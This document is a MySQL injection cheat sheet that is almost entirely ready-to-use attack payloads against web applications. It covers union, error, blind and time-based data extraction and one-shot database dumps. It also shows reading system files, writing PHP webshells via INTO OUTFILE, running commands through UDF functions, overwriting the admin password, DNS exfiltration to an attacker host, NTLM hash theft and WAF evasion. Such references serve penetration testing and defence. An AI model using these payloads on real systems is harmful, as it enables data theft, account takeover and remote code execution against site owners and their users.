# MySQL Injection

> MySQL Injection  is a type of security vulnerability that occurs when an attacker is able to manipulate the SQL queries made to a MySQL database by injecting malicious input. This vulnerability is often the result of improperly handling user input, allowing attackers to execute arbitrary SQL code that can compromise the database's integrity and security.


## Summary

* [MYSQL Default Databases](#mysql-default-databases)
* [MYSQL Comments](#mysql-comments)
* [MYSQL Testing Injection](#mysql-testing-injection)
* [MYSQL Union Based](#mysql-union-based)
    * [Detect Columns Number](#detect-columns-number)
        * [Iterative NULL Method](#iterative-null-method)
        * [ORDER BY Method](#order-by-method)
        * [LIMIT INTO Method](#limit-into-method)
    * [Extract Database With Information_schema](#extract-database-with-information_schema)
    * [Extract Columns Name Without Information_Schema](#extract-columns-name-without-information_schema)
    * [Extract Data Without Columns Name](#extract-data-without-columns-name)
* [MYSQL Error Based](#mysql-error-based)
    * [MYSQL Error Based - Basic](#mysql-error-based---basic)
    * [MYSQL Error Based - UpdateXML Function](#mysql-error-based---updatexml-function)
    * [MYSQL Error Based - Extractvalue Function](#mysql-error-based---extractvalue-function)
* [MYSQL Blind](#mysql-blind)
    * [MYSQL Blind With Substring Equivalent](#mysql-blind-with-substring-equivalent)
    * [MYSQL Blind Using A Conditional Statement](#mysql-blind-using-a-conditional-statement)
    * [MYSQL Blind With MAKE_SET](#mysql-blind-with-make_set)
    * [MYSQL Blind With LIKE](#mysql-blind-with-like)
    * [MySQL Blind With REGEXP](#mysql-blind-with-regexp)
* [MYSQL Time Based](#mysql-time-based)
    * [Using SLEEP in a Subselect](#using-sleep-in-a-subselect)
    * [Using Conditional Statements](#using-conditional-statements)
* [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
* [MYSQL Current Queries](#mysql-current-queries)
* [MYSQL Read Content of a File](#mysql-read-content-of-a-file)
* [MYSQL Command Execution](#mysql-command-execution)
    * [WEBSHELL - OUTFILE method](#shell---outfile-method)
    * [WEBSHELL - DUMPFILE method](#shell---dumpfile-method)
    * [COMMAND - UDF Library](#udf-library)
* [MYSQL INSERT](#mysql-insert)
* [MYSQL Truncation](#mysql-truncation)
* [MYSQL Out of Band](#mysql-out-of-band)
    * [DNS Exfiltration](#dns-exfiltration)
    * [UNC Path - NTLM Hash Stealing](#unc-path---ntlm-hash-stealing)
* [MYSQL WAF Bypass](#mysql-waf-bypass)
    * [Alternative to Information Schema](#alternative-to-information-schema)
    * [Alternative to VERSION](#alternative-to-version)
    * [Alternative to GROUP_CONCAT](#alternative-to-group_concat)
    * [Scientific Notation](#scientific-notation)
    * [Conditional Comments](#conditional-comments)
    * [Wide Byte Injection (GBK)](#wide-byte-injection-gbk)
* [References](#references)


## MYSQL Default Databases

| Name               | Description              |
|--------------------|--------------------------|
| mysql              | Requires root privileges |
| information_schema | Available from version 5 and higher |
	

## MYSQL Comments

MySQL comments are annotations in SQL code that are ignored by the MySQL server during execution.

| Type                       | Description                       |
|----------------------------|-----------------------------------|
| `#`                        | Hash comment                      |
| `/* MYSQL Comment */`      | C-style comment                   |
| `/*! MYSQL Special SQL */` | Special SQL                       |
| `/*!32302 10*/`            | Comment for MYSQL version 3.23.02 |
| `--`                       | SQL comment                       |
| `;%00`                     | Nullbyte                          |
| \`                         | Backtick                          |


## MYSQL Testing Injection

* **Strings**: Query like `SELECT * FROM Table WHERE id = 'FUZZ';`
    ```
    '	False
    ''	True
    "	False
    ""	True
    \	False
    \\	True
    ```

* **Numeric**: Query like `SELECT * FROM Table WHERE id = FUZZ;`
    ```ps1
    AND 1	    True
    AND 0	    False
    AND true	True
    AND false	False
    1-false	    Returns 1 if vulnerable
    1-true	    Returns 0 if vulnerable
    1*56	    Returns 56 if vulnerable
    1*56	    Returns 1 if not vulnerable
    ```

* **Login**: Query like `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`
    ```ps1
    ' OR '1
    ' OR 1 -- -
    " OR "" = "
    " OR 1 = 1 -- -
    '='
    'LIKE'
    '=0--+
    ```


## MYSQL Union Based

### Detect Columns Number

To successfully perform a union-based SQL injection, an attacker needs to know the number of columns in the original query.


#### Iterative NULL Method

Systematically increase the number of columns in the `UNION SELECT` statement until the payload executes without errors or produces a visible change. Each iteration checks the compatibility of the column count.

```sql
UNION SELECT NULL;--
UNION SELECT NULL, NULL;-- 
UNION SELECT NULL, NULL, NULL;-- 
```


#### ORDER BY Method

Keep incrementing the number until you get a `False` response. Even though `GROUP BY` and `ORDER BY` have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.

| ORDER BY        | GROUP BY        | Result |
| --------------- | --------------- | ------ |
| `ORDER BY 1--+` | `GROUP BY 1--+` | True   |
| `ORDER BY 2--+` | `GROUP BY 2--+` | True   |
| `ORDER BY 3--+` | `GROUP BY 3--+` | True   |
| `ORDER BY 4--+` | `GROUP BY 4--+` | False  |

Since the result is false for `ORDER BY 4`, it means the SQL query is only having 3 columns.
In the `UNION` based SQL injection, you can `SELECT` arbitrary data to display on the page: `-1' UNION SELECT 1,2,3--+`.

Similar to the previous method, we can check the number of columns with one request if error showing is enabled.

```sql
ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'
```


#### LIMIT INTO Method

This method is effective when error reporting is enabled. It can help determine the number of columns in cases where the injection point occurs after a LIMIT clause. 

| Payload                      | Error           |
| ---------------------------- | --------------- |
| `1' LIMIT 1,1 INTO @--+`     | `The used SELECT statements have a different number of columns` |
| `1' LIMIT 1,1 INTO @,@--+ `  | `The used SELECT statements have a different number of columns` |
| `1' LIMIT 1,1 INTO @,@,@--+` | `No error means query uses 3 columns` |

Since the result doesn't show any error it means the query uses 3 columns: `-1' UNION SELECT 1,2,3--+`.


### Extract Database With Information_Schema

This query retrieves the names of all schemas (databases) on the server.

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
```

This query retrieves the names of all tables within a specified schema (the schema name is represented by PLACEHOLDER).

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER
```

This query retrieves the names of all columns in a specified table.

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...
```

This query aims to retrieve data from a specific table.

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...
```


### Extract Columns Name Without Information_Schema

Method for `MySQL >= 4.1`.

| Payload | Output |
| --- | --- |
| `(1)and(SELECT * from db.users)=(1)` | Operand should contain **4** column(s) |
| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**' cannot be null |

Method for `MySQL 5`

| Payload | Output |
| --- | --- |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a` | Duplicate column name '**id**' |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a` | Duplicate column name '**name**' |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data |


### Extract Data Without Columns Name 

Extracting data from the 4th column without knowing its name.

```sql
SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
```

Injection example inside the query `select author_id,title from posts where author_id=[INJECT_HERE]`

```sql
MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
```


## MYSQL Error Based

| Name         | Payload         |
| ------------ | --------------- |
| GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -` |
| JSON_KEYS    | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |
| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -` |
| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -` |
| EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -` |
| OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -` |
| NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--` |
| UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1` |


### MYSQL Error Based - Basic

Works with `MySQL >= 4.1`

```sql
(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))
'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'
```


### MYSQL Error Based - UpdateXML Function

```sql
AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

Shorter to read:

```sql
UPDATEXML(null,CONCAT(0x0a,version()),null)-- -
UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```


### MYSQL Error Based - Extractvalue Function

Works with `MySQL >= 5.1`

```sql
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
```


### MYSQL Error Based - NAME_CONST function (only for constants)

Works with `MySQL >= 5.0`

```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```


## MYSQL Blind

### MYSQL Blind With Substring Equivalent

| Function | Example | Description |
| --- | --- | --- |
| `SUBSTR` | `SUBSTR(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |
| `SUBSTRING` | `SUBSTRING(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |
| `RIGHT` | `RIGHT(left(version(),1),1)=5` | Extracts a number of characters from a string (starting from right) |
| `MID` | `MID(version(),1,1)=4` | Extracts a substring from a string (starting at any position) |
| `LEFT` | `LEFT(version(),1)=4` | Extracts a number of characters from a string (starting from left) |

Examples of Blind SQL injection using `SUBSTRING` or another equivalent function:

```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```


### MYSQL Blind Using a Conditional Statement

* TRUE: `if @@version starts with a 5`:

    ```sql
    2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
    Response:
    HTTP/1.1 500 Internal Server Error
    ```

* FALSE: `if @@version starts with a 4`:

    ```sql
    2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
    Response:
    HTTP/1.1 200 OK
    ```


### MYSQL Blind With MAKE_SET

```sql
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
```


### MYSQL Blind With LIKE

In MySQL, the `LIKE` operator can be used to perform pattern matching in queries. The operator allows the use of wildcard characters to match unknown or partial string values. This is especially useful in a blind SQL injection context when an attacker does not know the length or specific content of the data stored in the database.

Wildcard Characters in LIKE:

* **Percentage Sign** (`%`): This wildcard represents zero, one, or multiple characters. It can be used to match any sequence of characters.
* **Underscore** (`_`): This wildcard represents a single character. It's used for more precise matching when you know the structure of the data but not the specific character at a particular position.

```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
SELECT * FROM products WHERE product_name LIKE '%user_input%'
```


### MySQL Blind with REGEXP

Blind SQL injection can also be performed using the MySQL `REGEXP` operator, which is used for matching a string against a regular expression. This technique is particularly useful when attackers want to perform more complex pattern matching than what the `LIKE` operator can offer.

| Payload | Description |
| --- | --- |
| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Checking length |
| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | Checking for the presence of digits |
| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Checking for data starting by "a" |


## MYSQL Time Based

The following SQL codes will delay the output from MySQL.

* MySQL 4/5 : [`BENCHMARK()`](https://dev.mysql.com/doc/refman/8.4/en/select-benchmarking.html)
    ```sql
    +BENCHMARK(40000000,SHA1(1337))+
    '+BENCHMARK(3200,SHA1(1))+'
    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
    ```

* MySQL 5: [`SLEEP()`](https://dev.mysql.com/doc/refman/8.4/en/miscellaneous-functions.html#function_sleep)
    ```sql
    RLIKE SLEEP([SLEEPTIME])
    OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
    XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
    AND SLEEP(10)=0
    AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)
    ```

### Using SLEEP in a Subselect

Extracting the length of the data.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# 
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
```

Extracting the first character.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#
```

Extracting the second character.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#
```

Extracting the third character.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#
```

Extracting column_name.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
```


### Using Conditional Statements

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```


## MYSQL DIOS - Dump in One Shot

DIOS (Dump In One Shot) SQL Injection is an advanced technique that allows an attacker to extract entire database contents in a single, well-crafted SQL injection payload. This method leverages the ability to concatenate multiple pieces of data into a single result set, which is then returned in one response from the database.

```sql
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
```

* SecurityIdiots
    ```sql
    make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
    ```

* Profexer
    ```sql
    (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
    ```

* Dr.Z3r0
    ```sql
    (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))
    ```

* M@dBl00d
    ```sql
    (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
    ```

* Zen
    ```sql
    +make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
    ```

* sharik
    ```sql
    (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
    ```


## MYSQL Current Queries

`INFORMATION_SCHEMA.PROCESSLIST` is a special table available in MySQL and MariaDB that provides information about active processes and threads within the database server. This table can list all operations that DB is performing at the moment.

The `PROCESSLIST` table contains several important columns, each providing details about the current processes. Common columns include: 

* **ID** : The process identifier.
* **USER** : The MySQL user who is running the process.
* **HOST** : The host from which the process was initiated.
* **DB** : The database the process is currently accessing, if any.
* **COMMAND** : The type of command the process is executing (e.g., Query, Sleep).
* **TIME** : The time in seconds that the process has been running.
* **STATE** : The current state of the process.
* **INFO** : The text of the statement being executed, or NULL if no statement is being executed.
     
```sql
SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
```

| ID  | USER      | HOST 	         | DB 	   | COMMAND | TIME | STATE      | INFO | 
| --- | --------- | ---------------- | ------- | ------- | ----	| ---------- | ---- | 
| 1	  | root	  | localhost        | testdb  | Query	 | 10	| executing	 | SELECT * FROM some_table | 
| 2	  | app_uset  | 192.168.0.101    | appdb   | Sleep	 | 300	| sleeping	 | NULL |
| 3	  | gues_user | example.com:3360 | NULL	   | Connect | 0    | connecting | NULL |


```sql
UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
```

Dump in one shot query to extract the whole content of the table.

```sql
UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```


## MYSQL Read Content of a File

Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`

```sql
UNION ALL SELECT LOAD_FILE('/etc/passwd') --
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
```

If you are `root` on the database, you can re-enable the `LOAD_FILE` using the following query

```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

## MYSQL Command Execution

### WEBSHELL - OUTFILE Method

```sql
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

### WEBSHELL - DUMPFILE Method

```sql
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

### COMMAND - UDF Library

First you need to check if the UDF are installed on the server.

```powershell
$ whereis lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so
```

Then you can use functions such as `sys_exec` and `sys_eval`.

```sql
$ mysql -u root -p mysql
Enter password: [...]

mysql> SELECT sys_eval('id');
+--------------------------------------------------+
| sys_eval('id') |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------------------------+
```


## MYSQL INSERT

`ON DUPLICATE KEY UPDATE` keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:

Inject using payload:

```sql
attacker_dummy@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
```

The query would look like this:

```sql
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "BCRYPT_HASH"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" -- ", "BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT");
```

This query will insert a row for the user "attacker_dummy@example.com". It will also insert a row for the user "admin@example.com".

Because this row already exists, the `ON DUPLICATE KEY UPDATE` keyword tells MySQL to update the `password` column of the already existing row to "P@ssw0rd". After this, we can simply authenticate with "admin@example.com" and the password "P@ssw0rd".


## MYSQL Truncation

In MYSQL "`admin `" and "`admin`" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.

```sql
`username` varchar(20) not null
```

Payload: `username = "admin               a"`


## MYSQL Out of Band

```powershell
SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';
SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt;
```

### DNS Exfiltration

```sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))
```

### UNC Path - NTLM Hash Stealing

The term "UNC path" refers to the Universal Naming Convention path used to specify the location of resources such as shared files or devices on a network. It is commonly used in Windows environments to access files over a network using a format like `\\server\share\file`.

```sql
SELECT LOAD_FILE('\\\\error\\abc');
SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);
SELECT '' INTO DUMPFILE '\\\\error\\abc';
SELECT '' INTO OUTFILE '\\\\error\\abc';
LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;
```

:warning: Don't forget to escape the '\\\\'.


## MYSQL WAF Bypass

### Alternative to Information Schema

`information_schema.tables` alternative

```sql
SELECT * FROM mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> SHOW TABLES IN dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```


### Alternative to VERSION

```sql
mysql> SELECT @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> SELECT @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT @@GLOBAL.VERSION;
+------------------+
| @@GLOBAL.VERSION |
+------------------+
| 8.0.27           |
+------------------+
```


### Alternative to GROUP_CONCAT

Requirement: `MySQL >= 5.7.22`

Use `json_arrayagg()` instead of `group_concat()` which allows less symbols to be displayed

* `group_concat()` = 1024 symbols
* `json_arrayagg()` > 16,000,000 symbols

```sql
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
```


### Scientific Notation

In MySQL, the e notation is used to represent numbers in scientific notation. It's a way to express very large or very small numbers in a concise format. The e notation consists of a number followed by the letter e and an exponent.
The format is: `base 'e' exponent`.

For example:

* `1e3` represents `1 x 10^3` which is `1000`. 
* `1.5e3` represents `1.5 x 10^3` which is `1500`. 
* `2e-3` represents `2 x 10^-3` which is `0.002`. 

The following queries are equivalent:

* `SELECT table_name FROM information_schema 1.e.tables` 
* `SELECT table_name FROM information_schema .tables` 

In the same way, the common payload to bypass authentication `' or ''='` is equivalent to `' or 1.e('')='` and `1' or 1.e(1) or '1'='1`. 
This technique can be used to obfuscate queries to bypass WAF, for example: `1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2` 


### Conditional Comments

MySQL conditional comments are enclosed within `/*! ... */` and can include a version number to specify the minimum version of MySQL that should execute the contained code.
The code inside this comment will be executed only if the MySQL version is greater than or equal to the number immediately following the `/*!`. If the MySQL version is less than the specified number, the code inside the comment will be ignored. 

* `/*!12345UNION*/`: This means that the word UNION will be executed as part of the SQL statement if the MySQL version is 12.345 or higher.
* `/*!31337SELECT*/`: Similarly, the word SELECT will be executed if the MySQL version is 31.337 or higher.

**Examples**: `/*!12345UNION*/`, `/*!31337SELECT*/`


### Wide Byte Injection (GBK)

Wide byte injection is a specific type of SQL injection attack that targets applications using multi-byte character sets, like GBK or SJIS. The term "wide byte" refers to character encodings where one character can be represented by more than one byte. This type of injection is particularly relevant when the application and the database interpret multi-byte sequences differently.

The `SET NAMES gbk` query can be exploited in a charset-based SQL injection attack. When the character set is set to GBK, certain multibyte characters can be used to bypass the escaping mechanism and inject malicious SQL code.

Several characters can be used to triger the injection.

* `%bf%27`: This is a URL-encoded representation of the byte sequence `0xbf27`. In the GBK character set, `0xbf27` decodes to a valid multibyte character followed by a single quote ('). When MySQL encounters this sequence, it interprets it as a single valid GBK character followed by a single quote, effectively ending the string.
* `%bf%5c`: Represents the byte sequence `0xbf5c`. In GBK, this decodes to a valid multi-byte character followed by a backslash (`\`). This can be used to escape the next character in the sequence.
* `%a1%27`: Represents the byte sequence `0xa127`. In GBK, this decodes to a valid multi-byte character followed by a single quote (`'`).

A lot of payloads can be created such as:

```sql
%A8%27 OR 1=1;--
%8C%A8%27 OR 1=1--
%bf' OR 1=1 -- --
```

Here is a PHP example using GBK encoding and filtering the user input to escape backslash, single and double quote.

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
      
    return $string;
}

$id=check_addslashes($_GET['id']);
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
print_r(mysql_error());
```

Here's a breakdown of how the wide byte injection works:

For instance, if the input is `?id=1'`, PHP will add a backslash, resulting in the SQL query: `SELECT * FROM users WHERE id='1\'' LIMIT 0,1`.

However, when the sequence `%df` is introduced before the single quote, as in `?id=1%df'`, PHP still adds the backslash. This results in the SQL query: `SELECT * FROM users WHERE id='1%df\'' LIMIT 0,1`. 

In the GBK character set, the sequence `%df%5c` translates to the character `連`. So, the SQL query becomes: `SELECT * FROM users WHERE id='1連'' LIMIT 0,1`. Here, the wide byte character `連` effectively "eating" the added escape charactr, allowing for SQL injection.

